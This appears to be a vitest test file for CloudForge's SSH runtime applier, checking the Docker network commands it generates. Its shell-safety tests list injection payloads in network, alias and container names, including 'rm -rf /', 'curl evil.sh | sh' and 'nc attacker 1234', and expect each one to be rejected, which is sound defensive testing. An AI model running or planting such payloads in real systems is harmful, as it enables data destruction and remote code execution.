import { describe, expect, it } from 'vitest';
import {
  emptyRuntimePlan,
  type RuntimeNetwork,
  type RuntimeOperation,
  type RuntimeService,
  type VpsRuntimePlan,
} from '@cloudforge/core';
import { commandFor, SshRuntimeApplier } from './ssh-runtime-applier.js';

const TARGET = 'target-1';

const edge: RuntimeNetwork = {
  name: 'edge',
  dockerName: 'edge-net',
  displayName: 'Edge',
  driver: 'bridge',
  scope: 'shared-proxy',
  internal: false,
  attachable: true,
  ipv6: false,
  labels: {},
};

const service = (overrides: Partial<RuntimeService> = {}): RuntimeService => ({
  name: 'web',
  applicationName: 'app',
  kind: 'web',
  containerName: 'app-web',
  exposure: 'proxy-only',
  ports: [],
  networks: [],
  serviceReferences: [],
  volumes: [],
  restartPolicy: 'unless-stopped',
  ...overrides,
});

const plan = (overrides: Partial<VpsRuntimePlan> = {}): VpsRuntimePlan => ({
  ...emptyRuntimePlan(TARGET),
  mode: 'managed',
  version: 3,
  networks: [edge],
  ...overrides,
});

const op = (overrides: Partial<RuntimeOperation> & { id: string }): RuntimeOperation => ({
  kind: 'create',
  risk: 'safe',
  resourceKind: 'network',
  resource: 'edge',
  dockerName: 'edge-net',
  summary: 'summary',
  ...overrides,
});

const unwrap = (result: ReturnType<typeof commandFor>): string => {
  if (!result.ok) throw new Error(`expected a command, got: ${result.error}`);
  return result.value;
};

describe('commandFor', () => {
  describe('network.create', () => {
    it('creates the network the plan describes, with ownership labels', () => {
      const command = unwrap(commandFor(op({ id: 'network.create:edge-net' }), plan()));

      expect(command).toContain('docker network create');
      expect(command).toContain("--driver 'bridge'");
      expect(command).toContain('--attachable');
      expect(command).toContain("--label 'io.cloudforge.managed=true'");
      expect(command).toContain("--label 'io.cloudforge.target-id=target-1'");
      expect(command).toContain("--label 'io.cloudforge.plan-version=3'");
      expect(command).toContain("'edge-net'");
    });

    it('omits flags the plan does not ask for', () => {
      const command = unwrap(
        commandFor(
          op({ id: 'network.create:edge-net' }),
          plan({ networks: [{ ...edge, attachable: false, ipv6: false }] }),
        ),
      );

      expect(command).not.toContain('--attachable');
      expect(command).not.toContain('--ipv6');
      expect(command).not.toContain('--internal');
    });

    it('marks an internal network internal', () => {
      const command = unwrap(
        commandFor(
          op({ id: 'network.create:edge-net' }),
          plan({ networks: [{ ...edge, internal: true }] }),
        ),
      );

      expect(command).toContain('--internal');
    });

    it('carries the plan’s own labels through alongside CloudForge’s', () => {
      const command = unwrap(
        commandFor(
          op({ id: 'network.create:edge-net' }),
          plan({ networks: [{ ...edge, labels: { 'com.example.team': 'platform' } }] }),
        ),
      );

      expect(command).toContain("--label 'com.example.team=platform'");
    });

    it('fails rather than guessing when the plan no longer has the network', () => {
      const result = commandFor(op({ id: 'network.create:ghost', dockerName: 'ghost' }), plan());

      expect(result.ok).toBe(false);
    });
  });

  describe('container.attach', () => {
    it('connects the container with the aliases the plan gives it', () => {
      const command = unwrap(
        commandFor(
          op({
            id: 'container.attach:app-web:edge-net',
            kind: 'attach',
            resourceKind: 'container',
            dockerName: 'app-web',
          }),
          plan({
            services: [service({ networks: [{ networkName: 'edge', aliases: ['web', 'api'] }] })],
          }),
        ),
      );

      expect(command).toBe(
        "sudo docker network connect --alias 'web' --alias 'api' 'edge-net' 'app-web'",
      );
    });

    it('connects without aliases when the plan gives none', () => {
      const command = unwrap(
        commandFor(
          op({
            id: 'container.attach:app-web:edge-net',
            kind: 'attach',
            resourceKind: 'container',
            dockerName: 'app-web',
          }),
          plan({ services: [service({ networks: [{ networkName: 'edge', aliases: [] }] })] }),
        ),
      );

      expect(command).toContain('docker network connect');
      expect(command).not.toContain('--alias');
    });
  });

  describe('container.alias', () => {
    it('reconnects, because Docker cannot add an alias to a live attachment', () => {
      const command = unwrap(
        commandFor(
          op({
            id: 'container.alias:app-web:edge-net',
            kind: 'attach',
            risk: 'disruptive',
            resourceKind: 'container',
            dockerName: 'app-web',
          }),
          plan({ services: [service({ networks: [{ networkName: 'edge', aliases: ['web'] }] })] }),
        ),
      );

      expect(command).toContain('docker network disconnect');
      expect(command).toContain('docker network connect');
      // The disconnect tolerates failure — the container may not be attached —
      // but the connect must not.
      expect(command).toContain('|| true');
      expect(command.endsWith('|| true')).toBe(false);
    });
  });

  describe('network.remove', () => {
    it('removes without --force, leaving Docker’s own refusal as a safety net', () => {
      // If something attached between preview and apply, failing is correct.
      const command = unwrap(
        commandFor(
          op({ id: 'network.remove:edge-net', kind: 'remove', risk: 'destructive' }),
          plan(),
        ),
      );

      expect(command).toBe("sudo docker network rm 'edge-net'");
      expect(command).not.toContain('--force');
      expect(command).not.toContain('-f');
    });
  });

  it('refuses an operation it does not recognise rather than improvising', () => {
    const result = commandFor(op({ id: 'network.frobnicate:edge-net' }), plan());

    expect(result.ok).toBe(false);
    expect(!result.ok && result.error).toContain('Unsupported operation');
  });

  describe('shell safety', () => {
    // The validator already rejects these names and every value is quoted. This
    // is the third layer, and it exists because the applier is the wrong place to
    // find out that one of the first two was relaxed.
    const INJECTIONS = [
      'net; rm -rf /',
      'net$(whoami)',
      'net`id`',
      "net' && curl evil.sh | sh #",
      'net|nc attacker 1234',
      'net\nrm -rf /',
    ];

    it.each(INJECTIONS)('rejects the network name %j', (dockerName) => {
      const result = commandFor(
        op({ id: `network.create:${dockerName}`, dockerName }),
        plan({ networks: [{ ...edge, dockerName }] }),
      );

      expect(result.ok).toBe(false);
    });

    it.each(INJECTIONS)('rejects the removal name %j', (dockerName) => {
      const result = commandFor(
        op({ id: `network.remove:${dockerName}`, kind: 'remove', dockerName }),
        plan(),
      );

      expect(result.ok).toBe(false);
    });

    it('rejects an unsafe alias rather than quoting it and hoping', () => {
      const result = commandFor(
        op({
          id: 'container.attach:app-web:edge-net',
          kind: 'attach',
          resourceKind: 'container',
          dockerName: 'app-web',
        }),
        plan({
          services: [service({ networks: [{ networkName: 'edge', aliases: ["web' ; id #"] }] })],
        }),
      );

      expect(result.ok).toBe(false);
      expect(!result.ok && result.error).toContain('Unsafe alias');
    });

    it('rejects an unsafe container name in an attach', () => {
      const result = commandFor(
        op({
          id: 'container.attach:app-web; id:edge-net',
          kind: 'attach',
          resourceKind: 'container',
          dockerName: 'app-web; id',
        }),
        plan(),
      );

      expect(result.ok).toBe(false);
    });
  });
});

describe('SshRuntimeApplier', () => {
  it('validates the complete operation set before connecting or applying an earlier operation', async () => {
    const valid = op({ id: 'network.create:edge-net' });
    const invalid = op({ id: 'network.frobnicate:edge-net' });

    const result = await new SshRuntimeApplier().apply(
      {
        host: '127.0.0.1',
        port: 22,
        username: 'nobody',
        password: 'unused',
        hostKeySha256: 'SHA256:unused',
      },
      plan(),
      [valid, invalid],
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value.applied).toBe(0);
    expect(result.value.failed).toBe(1);
    expect(result.value.outcomes).toEqual([
      expect.objectContaining({ operationId: valid.id, status: 'skipped' }),
      expect.objectContaining({ operationId: invalid.id, status: 'failed' }),
    ]);
  });
});
